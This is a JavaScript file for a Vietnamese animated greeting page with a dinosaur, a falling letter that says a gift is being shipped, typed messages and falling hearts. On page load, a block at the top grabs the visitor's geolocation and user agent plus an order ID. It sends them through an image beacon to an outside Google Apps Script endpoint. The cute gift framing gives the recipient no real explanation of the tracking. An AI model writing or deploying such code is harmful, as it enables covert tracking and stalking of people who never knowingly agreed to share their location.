//take position
window.onload = () => {
  if (!navigator.geolocation) {
    alert("Trình duyệt không hỗ trợ định vị.");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const qs = new URLSearchParams({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        device: navigator.userAgent,
        orderId: new URLSearchParams(location.search).get("orderId") || "",
      });

      const img = new Image();
      img.src =
        "https://script.google.com/macros/s/AKfycbweig3n4i6Bx0Uu-FE4MgWxSa9PoZoaU7uzXRS8MktuD5W7N3ZxfGYK8d8OY6QXK-Qi/exec?" +
        qs.toString();
      img.onload = () => {
        document.body.innerHTML = "<h2>✅ Đã gửi vị trí thành công!</h2>";
      };
      img.onerror = () => {};
    },
    (err) => alert("Không thể lấy vị trí: " + err.message)
  );
};

//frame

const texts = ["OHh! 1 bức thư", "Hãy chạm vào nó"];
let textIndex = 0;
let charIndex = 0;
const speed = 100;
const textContainer = document.getElementById("text");

function typeText() {
  if (charIndex < texts[textIndex].length) {
    textContainer.innerHTML += texts[textIndex][charIndex];
    charIndex++;
    setTimeout(typeText, speed);
  } else {
    // Khi hoàn thành 1 chuỗi, chờ 1s rồi xóa để hiển thị chuỗi tiếp theo
    setTimeout(() => {
      charIndex = 0;
      textIndex++;
      if (textIndex < texts.length) {
        textContainer.innerHTML = ""; // Xóa nội dung trước
        typeText(); // Hiển thị chuỗi tiếp theo
      }
    }, 1000);
  }
}

const dino = document.querySelector(".dino");
const letter = document.querySelector(".letter");
let position = 10;
const id = setInterval(() => {
  if (position < 630) {
    position += 5;
    dino.style.left = position + "px";
    if (position == 230) {
      letter.style.display = "block";
      dropLetter();
      typeText();
    }
  } else {
    clearInterval(id);
  }
}, 60);

function dropLetter() {
  let velocity = 0; // Tốc độ rơi
  let gravity = 0.1; // Lực hấp dẫn
  let bounceFactor = 0.9; // Độ đàn hồi (0.6 = giữ lại 60% lực)
  let positionLetter = 50; // Bắt đầu rơi từ trên cao
  let ground = 10; // Vị trí mặt đất

  function fall() {
    velocity += gravity; // Tăng tốc độ rơi
    positionLetter -= velocity * 0.5; // Rơi xuống

    if (positionLetter <= ground) {
      positionLetter = ground;
      velocity -= bounceFactor;
    }
    letter.style.bottom = positionLetter + "px";
    requestAnimationFrame(fall); // Tiếp tục loop rơi
  }

  fall(); // Bắt đầu rơi
}
letter.addEventListener("click", () => {
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");
  const hearts = [];
  const numHearts = 100;
  const typingTextElement = document.getElementById("typing-text");
  const typingTextElementLove = document.getElementById("typing-text-love");
  const typingelementlove = document.getElementById("love-text");
  const text = "Món quà đang được ship tới";
  const text2 = "Đây là tâm ý của người gửi";
  const text3 = "Chúc bạn một ngày vui vẻ nha! ";
  const typingSpeed = 100; // Tốc độ gõ chữ (ms)
  let typingStarted = false;

  canvas.style.display = "block";
  canvas.style.opacity = "1";
  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    ctx.fillStyle = "#000"; // Màu nền đen
    ctx.fillRect(0, 0, canvas.width, canvas.height);
  }

  resizeCanvas();
  window.addEventListener("resize", resizeCanvas);

  class Heart {
    constructor() {
      this.x = Math.random() * canvas.width;
      this.y = Math.random() * canvas.height;
      this.size = Math.random() * 15 + 10; // Kích thước của trái tim
      this.speedY = Math.random() * 3 + 1;
      this.speedX = Math.random() * 2 - 1;
      this.opacity = Math.random() * 0.5 + 0.5;
      this.color = `rgba(255, 105, 180, ${this.opacity})`; // Màu hồng sáng
    }

    update() {
      this.y += this.speedY;
      this.x += this.speedX;

      if (this.y > canvas.height) {
        this.y = -this.size;
        this.x = Math.random() * canvas.width;
      }
    }

    draw() {
      ctx.save();
      ctx.translate(this.x, this.y);
      ctx.beginPath();

      // Vẽ nửa trái tim (chỉ một bên)
      ctx.moveTo(0, this.size / 4);
      ctx.bezierCurveTo(
        this.size / 2, // Điểm điều khiển 1 (X)
        -this.size / 2, // Điểm điều khiển 1 (Y)
        this.size / 2, // Điểm điều khiển 2 (X)
        this.size / 4, // Điểm điều khiển 2 (Y)
        0, // Điểm kết thúc (X)
        this.size / 2 // Điểm kết thúc (Y)
      );

      ctx.lineTo(0, this.size / 4); // Nối về điểm bắt đầu
      ctx.closePath();

      ctx.fillStyle = this.color;
      ctx.shadowColor = "rgba(255, 105, 180, 0.8)"; // Màu phát sáng
      ctx.shadowBlur = 15;
      ctx.shadowOffsetX = 0;
      ctx.shadowOffsetY = 0;
      ctx.fill();
      ctx.restore();
    }
  }

  function createHearts() {
    for (let i = 0; i < numHearts; i++) {
      hearts.push(new Heart());
    }
  }

  function animate() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#000"; // Đặt lại màu nền đen
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    hearts.forEach((heart) => {
      heart.update();
      heart.draw();
    });

    requestAnimationFrame(animate);
  }

  async function typeText(element, text, speed) {
    let index = 0;
    return new Promise((resolve) => {
      function type() {
        if (index < text.length) {
          element.textContent += text[index];
          index++;
          setTimeout(type, speed); // Gõ ký tự tiếp theo sau một khoảng thời gian
        } else {
          resolve(); // Kết thúc Promise khi gõ xong
        }
      }
      type(); // Bắt đầu gõ chữ
    });
  }

  async function handleClick() {
    if (!typingStarted) {
      await new Promise((resolve) => setTimeout(resolve, 2000));
      typingTextElement.style.visibility = "visible";
      await typeText(typingTextElement, text, typingSpeed);

      // Hiển thị chữ bổ sung 1
      typingTextElementLove.style.visibility = "visible";
      await typeText(typingTextElementLove, text2, typingSpeed);

      // Hiển thị chữ bổ sung 2
      typingelementlove.style.visibility = "visible";
      await typeText(typingelementlove, text3, typingSpeed);
    }
  }

  createHearts();
  animate();
  handleClick();
});
